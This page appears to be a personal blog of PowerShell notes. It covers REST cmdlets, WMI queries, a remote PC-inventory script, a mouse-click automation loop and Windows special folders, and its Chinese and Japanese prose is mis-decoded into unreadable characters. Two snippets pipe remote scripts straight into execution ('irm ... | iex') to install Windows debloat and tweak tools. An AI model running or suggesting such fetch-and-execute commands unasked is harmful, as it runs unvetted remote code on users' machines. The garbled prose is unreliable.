å¾Œè€…ï¼ˆWebRequestï¼‰ã¯ã“ã®ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆç‰¹æœ‰ã®ã‚‚ã®ã§ã™ã­ã€‚</p>
<p>RestMethod ã®ã»ã†ãŒ XML ã‚„ JSON ã‚’æ‰±ã„ã‚„ã™ã„</p>
<p>å˜ç´”ã«æ‰‹é–“ãŒä¸€ã¤å°‘ãªã„ã¨ã„ã†ã ã‘ã§ã¯ã‚ã‚Šã¾ã™ãŒã€Json ã‚’æ‰±ã†ãªã‚‰ RestMethod ãŒè‰¯ã•ãã†ã§ã™ã­ã€‚<br>
ã¾ãŸã€æ§‹é€ ã¨ã—ã¦ã¯ã©ã¡ã‚‰ã‚‚åŒã˜ã‚‰ã—ãã€å‡ºåŠ›ã®ãƒ‡ãƒ¼ã‚¿å½¢å¼ãŒç•°ãªã‚‹ä»¥å¤–ã®ç›¸é•ç‚¹ã¯ãªã„ãã†ã§ã™ã€‚</p>
<h2>åˆ é™¤Windowså†…ç½®app <a href="https://github.com/raphire/win11debloat/">win11debloat</a></h2>
<pre class="notranslate"><code class="notranslate">irm "https://win11debloat.raphi.re/" | iex
</code></pre>
<h2>ä¿®æ”¹Winè®¾ç½® <a href="https://github.com/ChrisTitusTech/winutil/">ChrisTitusTech/winutil</a></h2>
<pre class="notranslate"><code class="notranslate">irm "https://christitus.com/win" | iex
</code></pre>
<h2>PowerShellã§WMIã‚¯ãƒ©ã‚¹ã®ä¸€è¦§ã‚’å–å¾—</h2>
<pre class="notranslate"><code class="notranslate">Get-WmiObject -list | Sort-Object
</code></pre>
<h2>WMIã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™</h2>
<pre class="notranslate"><code class="notranslate">Get-WmiObject -list | Select-String ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰
ä¾‹ï¼šGet-WmiObject -list | Select-String Win32_Disk
ã€€ã€€Get-WmiObject -list | Select-String Win32_System
ã€€ã€€Get-WmiObject -list | Select-String Win32_Oper
</code></pre>
<hr>
<h2>ç¤ºä¾‹ï¼šè·å–æœ¬åœ°PCçš„ä¿¡æ¯ï¼ˆä¿å­˜ä¸º<code class="notranslate">getPCInfo.ps1</code>ï¼‰</h2>
<pre class="notranslate"><code class="notranslate">function global:getPCInfo ($pcname) {
    if ($pcname -eq $null) {
        $pcname = 'localhost'
    }

    $ErrorActionPreference = "silentlycontinue"
    $outputString = ""

    if (Test-Connection $pcname -count 1) {
        $outputString += "====================================================`n"
        $outputString += $pcname + "`n"
        $outputString += "--------------------------`n"
        
        $ComputerSystem = Get-WmiObject Win32_ComputerSystem -computername $pcname

        # ComputerName
        $outputString += ("ComputerName   : " + $ComputerSystem.Name + "`n")

        # IPAddress
        $IPAddressArray = (Get-WmiObject Win32_NetworkAdapterConfiguration -computername $pcname).IPAddress
        $IPAddress = ""
        foreach ($ip in $IPAddressArray) {
            if ($ip -ne $null){
                $IPAddress = $ip
            }
        }
        $outputString += ("IPAddress      : " + $IPAddress + "`n")
        
        # Model
        $outputString += ("Model          : " + $ComputerSystem.Model + "`n")

        # BaseBoard
        $BaseBoard = Get-WmiObject Win32_BaseBoard -computername $pcname
        $outputString += ("MotherBoard    : " + $BaseBoard.Manufacturer + " " + $BaseBoard.Product + "`n")

        # OS
        $OS = Get-WmiObject Win32_OperatingSystem -computername $pcname
        $outputString += ("OS             : " + $OS.Caption + "`n")

        # CPU
        $Processor = Get-WmiObject Win32_Processor -computername $pcname
        if ($Processor.GetType().Name -eq "Object[]"){
            $Processor = $Processor[0]
        }
        $outputString += ("CPU            : " + $Processor.Name + "`n")
        
        # RAM
        $Capacitys = (Get-WmiObject Win32_PhysicalMemory -computername $pcname).Capacity
        for ($i = 0; $i -lt $Capacitys.length; $i++) {
            $Capacitys[$i] = [string][int]($Capacitys[$i]/1GB)
        }
        $TotalPhysicalMemory = [int]($ComputerSystem.TotalPhysicalMemory/1GB)
        $outputString += ("RAM            : " + $TotalPhysicalMemory + " GB [" + ($Capacitys -join "/") + "]`n")
        
        # VideoController
        $VideoController = Get-WmiObject Win32_VideoController -computername $pcname
        
        if ($VideoController.GetType().Name -ne "Object[]"){
            $VideoController = @($VideoController)
        }
        
        $outputString += ("VideoController:`n")
        for ($i = 0; $i -lt $VideoController.length; $i++) {
            $outputString += ("    " + $VideoController[$i].Name + "  [" + $VideoController[$i].CurrentHorizontalResolution + " x " + $VideoController[$i].CurrentVerticalResolution + "]`n")
        }
        
        # NetworkAdapter
        $NetworkAdapterNames = (Get-WmiObject Win32_NetworkAdapter -Filter "NetConnectionStatus = 2" -computername $pcname).Name
        if ($NetworkAdapterNames.GetType().Name -ne "Object[]"){
            $NetworkAdapterNames = @($NetworkAdapterNames)
        }
        $outputString += "NetworkAdapter :`n"
        foreach ($n in $NetworkAdapterNames) {
            $outputString += ("    " + $n + "`n")
        }
        
        # LogicalDisk
        $LocalDisk = Get-WmiObject Win32_LogicalDisk -Filter "DriveType = 3" -computername $pcname
        
        if ($LocalDisk.GetType().Name -ne "Object[]"){
            $LocalDisk = @($LocalDisk)
        }

        $outputString += "LocalDisk      :`n"
        $disks = $LocalDisk
        for ($i = 0; $i -lt $LocalDisk.length; $i++) {
            $outputString += ("    " + $LocalDisk[$i].DeviceID + " " + [int]($LocalDisk[$i].Size/1GB) + " GB [FreeSpace:" + [int]($LocalDisk[$i].FreeSpace/1GB) + " GB]`n")
            $disks[$i] = ($LocalDisk[$i].DeviceID + " " + [int]($LocalDisk[$i].Size/1GB) + " GB [Free:" + [int]($LocalDisk[$i].FreeSpace/1GB) + " GB]")
        }
    } else {
        $outputString += "====================================================`n"
        $outputString += ($pcname + " not responding...`n")
    }
    
    echo $outputString
    $ErrorActionPreference = "continue"
}
</code></pre>
<p>è°ƒç”¨ï¼š</p>
<pre class="notranslate"><code class="notranslate">$ .\getPCInfo.ps1

// localhost
$ getPCInfo

// network
$ getPCInfo &lt;computername&gt;
</code></pre>
<p>ç»“æœï¼š</p>
<pre class="notranslate"><code class="notranslate">====================================================
localhost
--------------------------
ComputerName   : COMPUTERNAME
IPAddress      : XXX.XXX.XXX.XXX
Model          : B460M
MotherBoard    : MouseComputer B460M
OS             : Microsoft Windows 11 Home
CPU            : Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz
RAM            : 16 GB [8/8]
VideoController:
    NVIDIA GeForce RTX 3060  [1920 x 1200]
NetworkAdapter :
    Intel(R) Ethernet Connection (12) I219-V
LocalDisk      :
    C: 476 GB [FreeSpace:88 GB]
    D: 1863 GB [FreeSpace:1151 GB]
</code></pre>
<h2>Powershell æ§åˆ¶é¼ æ ‡ç§»åŠ¨</h2>
<pre class="notranslate"><code class="notranslate"># .NET Frameworkã®å®£è¨€
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 

# Windows APIã®å®£è¨€
$signature=@'
[DllImport("user32.dll",CharSet=CharSet.Auto,CallingConvention=CallingConvention.StdCall)]
public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);
'@
$SendMouseClick = Add-Type -memberDefinition $signature -name "Win32MouseEventNew" -namespace Win32Functions -passThru

while ($true) {

    # ãƒã‚¦ã‚¹ã‚«ãƒ¼ã‚½ãƒ«ç§»å‹•
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(627, 379)
    # å·¦ã‚¯ãƒªãƒƒã‚¯
    $SendMouseClick::mouse_event(0x0002, 0, 0, 0, 0);
    $SendMouseClick::mouse_event(0x0004, 0, 0, 0, 0);
    Start-Sleep -s 3

    # ãƒã‚¦ã‚¹ã‚«ãƒ¼ã‚½ãƒ«ç§»å‹•
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(859, 194)
    # å·¦ã‚¯ãƒªãƒƒã‚¯
    $SendMouseClick::mouse_event(0x0002, 0, 0, 0, 0);
    $SendMouseClick::mouse_event(0x0004, 0, 0, 0, 0);
    Start-Sleep -s 3
}
</code></pre>
<h2>Windowsç‰¹æ®Šæ–‡ä»¶å¤¹</h2>
<ul>
<li>System.Environmentã‚’ä½¿ã£ã¦ç‰¹æ®Šãƒ•ã‚©ãƒ«ãƒ€ä¸€è¦§ãƒªã‚¹ãƒˆã‚’å‡ºåŠ›</li>
</ul>
<pre class="notranslate"><code class="notranslate">[Environment+SpecialFolder]::GetNames([Environment+SpecialFolder]) | Sort-Object

â†“â†“ç‰¹æ®Šãƒ•ã‚©ãƒ«ãƒ€ã®ä¸€è¦§
AdminTools
ApplicationData
CDBurning
CommonAdminTools
CommonApplicationData
CommonDesktopDirectory
CommonDocuments
CommonMusic
CommonOemLinks
CommonPictures
CommonProgramFiles
CommonProgramFilesX86
CommonPrograms
CommonStartMenu
CommonStartup
CommonTemplates
CommonVideos
Cookies
Desktop
DesktopDirectory
Favorites
Fonts
History
InternetCache
LocalApplicationData
LocalizedResources
MyComputer
MyDocuments
MyMusic
MyPictures
MyVideos
NetworkShortcuts
Personal
PrinterShortcuts
ProgramFiles
ProgramFilesX86
Programs
Recent
Resources
SendTo
StartMenu
Startup
System
SystemX86
Templates
UserProfile
Windows
</code></pre>
<ul>
<li>å„ç‰¹æ®Šãƒ•ã‚©ãƒ«ãƒ€ã®ãƒ‘ã‚¹ã®å–å¾—æ–¹æ³•ã¯ã€Enviroment.GetFolderPath() ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨</li>
</ul>
<pre class="notranslate"><code class="notranslate">[Environment]::GetFolderPath("Desktop")
&gt; C:\Users\xyz\Desktop

[Environment]::GetFolderPath("AdminTools")
&gt; C:\Users\xyz\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools

[Environment]::GetFolderPath("ProgramFiles")
&gt; C:\Program Files (x86)
</code></pre>
<ul>
<li>ç‰¹æ®Šãƒ•ã‚©ãƒ«ãƒ€ã®ãƒ‘ã‚¹ä¸€è¦§ã‚’å‡ºåŠ›</li>
</ul>
<pre class="notranslate"><code class="notranslate">$SpecialFolders = @{}
$names = [Environment+SpecialFolder]::GetNames([Environment+SpecialFolder]) | Sort-Object
$names | Format-Table

foreach($name in $names)
{
  if($path = [Environment]::GetFolderPath($name)){
    $SpecialFolders[$name] = $path
  }
}
$SpecialFolders | Format-Table

# â†“â†“ãƒ‘ã‚¹ä¸€è¦§
Name                           Value
----                           -----
System                         C:\WINDOWS\system32
CommonApplicationData          C:\ProgramData
CommonVideos                   C:\Users\Public\Videos
CDBurning                      C:\Users\win11\AppData\Local\Microsoft\Windows\Burn\Burn
MyVideos                       C:\Users\win11\Videos
ProgramFilesX86                C:\Program Files (x86)
AdminTools                     C:\Users\win11\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools
History                        C:\Users\win11\AppData\Local\Microsoft\Windows\History
CommonDocuments                C:\Users\Public\Documents
Templates                      C:\Users\win11\AppData\Roaming\Microsoft\Windows\Templates
CommonDesktopDirectory         C:\Users\Public\Desktop
UserProfile                    C:\Users\win11
Startup                        C:\Users\win11\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
InternetCache                  C:\Users\win11\AppData\Local\Microsoft\Windows\INetCache
SystemX86                      C:\WINDOWS\SysWOW64
CommonStartMenu                C:\ProgramData\Microsoft\Windows\Start Menu
MyPictures                     C:\Users\win11\Pictures
Recent                         C:\Users\win11\AppData\Roaming\Microsoft\Windows\Recent
Fonts                          C:\WINDOWS\Fonts
SendTo                         C:\Users\win11\AppData\Roaming\Microsoft\Windows\SendTo
CommonProgramFiles             C:\Program Files\Common Files
ProgramFiles                   C:\Program Files
Favorites                      C:\Users\win11\Favorites
CommonStartup                  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
Windows                        C:\WINDOWS
DesktopDirectory               C:\Users\win11\Desktop
LocalizedResources             C:\WINDOWS
MyMusic                        C:\Users\win11\Music
ApplicationData                C:\Users\win11\AppData\Roaming
CommonPictures                 C:\Users\Public\Pictures
CommonPrograms                 C:\ProgramData\Microsoft\Windows\Start Menu\Programs
Desktop                        C:\Users\win11\Desktop
PrinterShortcuts               C:\Users\win11\AppData\Roaming\Microsoft\Windows\Printer Shortcuts
CommonAdminTools               C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools
NetworkShortcuts               C:\Users\win11\AppData\Roaming\Microsoft\Windows\Network Shortcuts
CommonMusic                    C:\Users\Public\Music
CommonProgramFilesX86          C:\Program Files (x86)\Common Files
Programs                       C:\Users\win11\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
Resources                      C:\WINDOWS\resources
MyComputer                     C:\WINDOWS
CommonTemplates                C:\ProgramData\Microsoft\Windows\Templates
CommonOemLinks                 C:\WINDOWS
MyDocuments                    C:\Users\win11\Documents
StartMenu                      C:\Users\win11\AppData\Roaming\Microsoft\Windows\Start Menu
Cookies                        C:\Users\win11\AppData\Local\Microsoft\Windows\INetCookies
LocalApplicationData           C:\Users\win11\AppData\Local
Personal                       C:\Users\win11\Documents
</code></pre></div>
<div style="font-size:small;margin-top:8px;float:right;">â¤ï¸ è½¬è½½æ–‡ç« è¯·æ³¨æ˜å‡ºå¤„ï¼Œè°¢è°¢ï¼â¤ï¸</div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">è¯„è®º</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright Â© <span id="copyrightYear"></span> <a href="https://grapehut.xyz">å°é¥…é ­ã®éƒ¨è½æ ¼</a> All Rights Reserved. </div>
<div id="footer2"><span id="filingNum"><a href="https://beian.miit.gov.cn/" target="_blank"><a href='https://icp.gov.moe/?keyword=20241189' target='_blank'>èŒICPå¤‡20241189å·</a></a> â€¢ </span>
    <span>Powered by <a href="https://github.com/Meekdai/Gmeek" target="_blank">Gmeek</a></span><br>
    <span id="runday"></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML= now.getFullYear();

if("08/31/2024"!=""){
    var startSite=new Date("08/31/2024");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="ç½‘ç«™è¿è¡Œ"+diffDay+"å¤©"+" â€¢ ";
}
</script>

<script src='../assets/RonanTheme.js'></script><script src='../assets/GmeekVercount.js'><script src='https://app.rybbit.io/api/script.js' data-site-id='1684' defer></script></script><script async src='https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9661896697976587' crossorigin='anonymous'></script>




    <script src='../assets/sakuraPlus.js'></script>


</div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'search': 'M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathSearch").setAttribute("d",IconList["search"]);
document.getElementById("pathHome").setAttribute("d",IconList["home"]);




//function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);
    cmButton.style.display="none";

    script=document.createElement("script");
    
    //script.setAttribute("src","https://giscus.app/client.js");
    //script.setAttribute("data-repo","hst1189/hst1189.github.io");
    //script.setAttribute("data-repo-id","R_kgDOMq37aA");
    //script.setAttribute("data-category","Announcements");
    //script.setAttribute("data-category-id","DIC_kwDOMq37aM4CkJR");
    //script.setAttribute("data-mapping","pathname");
    //script.setAttribute("data-strict","0");
    //script.setAttribute("data-reactions-enabled","1");
    //script.setAttribute("data-emit-metadata","0");
    //script.setAttribute("data-input-position","bottom");
    //script.setAttribute("data-theme","preferred_color_scheme");
    //script.setAttribute("data-lang","zh-CN");
    //script.setAttribute("data-loading","lazy");
    //script.setAttribute("crossorigin","anonymous");
    //script.setAttribute("async","");
    
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","hst1189/hst1189.github.io");
    script.setAttribute("issue-term","title");
    
    script.setAttribute("theme","github-light");
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    
    cm.appendChild(script);
    int=self.setInterval("iFrameLoading()",200);
//}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utteranc');
    if(utterances.length==1){
        //if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("Comment Load OK");
        //}
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>
<script src='../assets/ArticleTOC.js'></script><script src='../assets/lightbox.js'></script><script>document.querySelectorAll('a').forEach(anchor => {const img = anchor.querySelector('img');if (img && img.hasAttribute('data-canonical-src')) {const canonicalSrc = img.getAttribute('data-canonical-src');anchor.setAttribute('href', canonicalSrc);img.setAttribute('src', canonicalSrc);img.removeAttribute('data-canonical-src');}});</script>

</html>
